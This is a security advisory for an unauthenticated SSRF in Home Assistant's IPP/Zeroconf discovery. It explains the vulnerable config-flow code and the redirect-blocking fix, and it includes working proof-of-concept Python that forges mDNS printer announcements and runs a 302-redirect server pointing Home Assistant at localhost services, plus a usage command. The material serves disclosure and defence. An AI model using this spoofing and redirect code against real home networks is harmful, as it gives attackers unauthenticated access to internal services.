# Home Assistant: mDNS Server-Side Request Forgery

- CWE: CWE-918
- Packages: pip:homeassistant

---

## Summary

Home Assistant Green is vulnerable to a Server-Side Request Forgery (SSRF) via the mDNS/Zeroconf IPP integration. An unauthenticated attacker on the local network can send a crafted mDNS response to trick Home Assistant into making HTTP requests to arbitrary hosts, including internal services bound to localhost. The IPP integration automatically processes `_ipp._tcp.local` service announcements without any user interaction or authentication, and follows HTTP redirects from the attacker-controlled host.

## Details

Home Assistant listens for mDNS service announcements on port 5353. When a service of type `_ipp._tcp.local` is discovered, the IPP integration's zeroconf handler (`homeassistant/components/ipp/config_flow.py`) processes it automatically.

The `async_step_zeroconf` method extracts `host`, `port`, and `base_path` directly from the mDNS discovery info without validation:

```python
async def async_step_zeroconf(
    self, discovery_info: ZeroconfServiceInfo
) -> ConfigFlowResult:
    host = discovery_info.host
    port = discovery_info.port
    zctype = discovery_info.type
    name = discovery_info.name.replace(f".{zctype}", "")
    tls = zctype == "_ipps._tcp.local."
    base_path = discovery_info.properties.get("rp", "ipp/print")

    self.discovery_info.update(
        {
            CONF_HOST: host,
            CONF_PORT: port,
            CONF_SSL: tls,
            CONF_VERIFY_SSL: False,
            CONF_BASE_PATH: f"/{base_path}",
            CONF_NAME: name,
            CONF_UUID: unique_id,
        }
    )
```

These values are then passed to `validate_input()`, which constructs an HTTP request (IPP over HTTP) to the attacker-controlled host:

```python
async def validate_input(hass: HomeAssistant, data: dict) -> dict[str, Any]:
    session = async_get_clientsession(hass)
    ipp = IPP(
        host=data[CONF_HOST],
        port=data[CONF_PORT],
        base_path=data[CONF_BASE_PATH],
        tls=data[CONF_SSL],
        verify_ssl=data[CONF_VERIFY_SSL],
        session=session,
    )
    printer = await ipp.printer()
    return {CONF_SERIAL: printer.info.serial, CONF_UUID: printer.info.uuid}
```

The core issue is that during the intentional discovery and retrieval of additional device information, the HTTP session blindly follows redirects. This allows an attacker to point the request at `127.0.0.1` or other internal services that are not otherwise network-accessible.

An attacker crafts an mDNS response advertising a fake IPP printer that points to the attacker's IP. The attacker's HTTP server then responds with a **302 redirect** to any internal endpoint, causing Home Assistant to make the request on the attacker's behalf.

## PoC

The PoC demonstrates the SSRF by sending a crafted mDNS response that causes Home Assistant to connect to the attacker's HTTP server, which redirects the request to an internal service.

### Prerequisites

- Attacker machine on the same local network as the Home Assistant Green device
- Python 3 with dependencies: `pip install -r requirements.txt`

### Exploit Code

The core mDNS spoofing function builds and sends a DNS response advertising a fake IPP printer:

```python
def build_dns_response(service_name, service_type, attacker_ip, attacker_port):
    transaction_id = 0x0000  # mDNS always 0
    flags = 0x8400           # Standard response, authoritative answer
    qdcount = 0
    ancount = 4              # 4 answers (service_type, SRV, TXT, A)
    nscount = 0
    arcount = 0

    SRV = service_name + '.' + service_type
    header = struct.pack("!HHHHHH", transaction_id, flags, qdcount, ancount, nscount, arcount)

    def encode_name(name):
        parts = name.split(".")
        out = b""
        for p in parts:
            out += bytes([len(p)]) + p.encode("utf-8")
        out += b"\x00"
        return out

    answers = b""

    # PTR record: _ipp._tcp.local -> meomeo._ipp._tcp.local
    answers += encode_name(service_type)
    answers += struct.pack("!HHI", 12, 1, 1)
    target = encode_name(SRV)
    answers += struct.pack("!H", len(target)) + target

    # SRV record
    answers += encode_name(SRV)
    answers += struct.pack("!HHI", 33, 1, 120)
    srv_data = struct.pack("!HHH", 0, 0, attacker_port) + encode_name("hihiabcdmeomeo.local")
    answers += struct.pack("!H", len(srv_data)) + srv_data

    # TXT record
    txt_strs = [b"abcd=efgh"]
    txt_record = b"".join(bytes([len(s)]) + s for s in txt_strs)
    answers += encode_name(SRV)
    answers += struct.pack("!HHI", 16, 1, 120)
    answers += struct.pack("!H", len(txt_record)) + txt_record

    # A record: hihiabcdmeomeo.local -> attacker IP
    answers += encode_name("hihiabcdmeomeo.local")
    answers += struct.pack("!HHI", 1, 1, 120)
    ip_bytes = socket.inet_aton(attacker_ip)
    answers += struct.pack("!H", len(ip_bytes)) + ip_bytes

    return header + answers

def send_mdns_response(service_name, service_type, has_ip, attacker_ip, attacker_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
    packet = build_dns_response(service_name, service_type, attacker_ip, attacker_port)
    sock.sendto(packet, (has_ip, 5353))
```

The attacker's HTTP server redirects the incoming IPP request to an internal service:

```python
class RedirectHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        self.send_response(302)
        self.send_header("Location", "http://127.0.0.1:<INTERNAL_PORT>/<path>")
        self.end_headers()
```

### Usage

```bash
python3 zeroconf.py -type _ipp._tcp.local -has_ip <HOME_ASSISTANT_IP> -attacker_ip <ATTACKER_IP> -name meomeo
```

### Exploit Flow

1. The script starts an HTTP server on port 8000 that responds with a 302 redirect to an internal service
2. A crafted mDNS response is sent to Home Assistant, advertising a fake IPP printer pointing to the attacker's IP and port 8000
3. Home Assistant's IPP integration automatically discovers the "printer" and connects to the attacker's HTTP server
4. The attacker's server responds with a 302 redirect to `http://127.0.0.1:<port>/<path>`
5. Home Assistant follows the redirect, making a request to the internal service on the attacker's behalf

## Impact

An unauthenticated attacker on the same local network can coerce Home Assistant into issuing HTTP requests to arbitrary hosts, including services bound to `127.0.0.1` or other internal addresses that are not otherwise reachable. Exploitation requires no user interaction and no prior IPP configuration — the IPP integration processes `_ipp._tcp.local` announcements automatically, and the HTTP client used to fetch printer metadata follows attacker-supplied redirects.

## Mitigations

The shared aiohttp client used by integrations now blocks cross-origin redirects to internal addresses: when a request to a non-loopback host is redirected to a loopback or unspecified address, the redirect is refused and an error is raised instead of being followed. The check matches both literal hostnames (`localhost` and its subdomains) and hostnames that resolve to a loopback IP, so DNS-based bypasses are covered. Relative redirects, non-network URI schemes, and requests that already target loopback (legitimate local integrations) are unaffected.

## Acknowledgements

Discovered by ZDI (ZDI-CAN-28336)
